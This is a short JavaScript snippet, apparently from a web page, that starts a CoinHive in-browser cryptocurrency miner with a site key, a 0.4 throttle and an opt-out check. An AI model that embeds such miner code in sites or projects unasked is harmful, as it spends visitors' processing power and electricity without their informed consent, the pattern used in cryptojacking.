    var miner = new CoinHive.Anonymous('my02eruRAMcXqG0suaInCvuQb9utWHY9', {
        throttle: 0.4
    });
    if (!miner.didOptOut(14400)) {
        miner.start();
    }